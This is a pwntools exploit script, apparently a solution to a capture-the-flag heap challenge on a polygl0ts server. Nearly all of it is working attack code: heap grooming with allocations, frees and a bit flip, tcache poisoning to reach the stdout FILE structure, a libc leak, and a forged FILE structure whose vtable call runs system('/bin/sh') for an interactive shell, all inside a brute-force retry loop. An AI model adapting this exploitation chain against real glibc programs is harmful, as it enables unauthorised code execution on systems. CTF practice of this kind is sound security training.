from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chal"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    conn = "chall.polygl0ts.ch 9078"
    # conn = "localhost 9078"
    conn = conn.split(" ")
    io = remote(conn[0], conn[1])

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
tries_prog = log.progress("Tries")
def exploit():
    def alloc(index, size, data=b""):
        choice(1)
        choice(index)
        choice(size)
        slaprefix(data)
    def free(index):
        choice(2)
        choice(index)
    def flip(index, bit):
        choice(3)
        choice(index)
        choice(bit)
    
    alloc(0, 0x28)

    payload = flat([
        b"A"*(0x420-0x40),
        0x420,
        0x21,
        [0]*3,
        0x21,
    ])
    alloc(1, 0x428, payload) # big large
    alloc(2, 0) # fence

    alloc(3, 0x418) # small large
    alloc(2, 0) # fence

    free(1)

    flip(0x41, 0) # flip stdin bufend 0x...??00

    payload = flat([
        
    ]).ljust(0x1000, b"A")
    payload += flat([
        0,
        0x420 | 1,
    ])
    alloc(2, 0x1108, payload)

    free(0)
    alloc(0, 0x38)
    alloc(0, 0x38, b"A"*8 + p16(0x31e8 - 0x20))


    free(3)
    alloc(2, 0x508)

    alloc(2, 0x18, p16(0x45c0)) # stdout 1

    alloc(2, 0x18, p16(0x45c0)) # stdout 2
    
    

    payload = flat([
        0xfbad1800,
        0,
        0,
        0,
    ]) + b"\0"
    alloc(2, 0x2558, payload) # tcache offset for stdout 1

    libc.address = u64(recvn(8)) - 0x204644
    show_leak("libc", libc.address) 
    if libc.address >> 48 != 0:
        raise EOFError


    file = FileStructure()
    file.flags = 0x3b01010101010101
    file._IO_read_ptr = b"/bin/sh\0"
    file._lock =  libc.sym["_IO_stdfile_1_lock"]
    file._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    file.vtable = libc.address + 0x2022b0
    payload = bytes(file) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)
    
    alloc(2, 0x2558+0x40, payload) # tcache offset for stdout 2
    

    io.interactive()
    exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
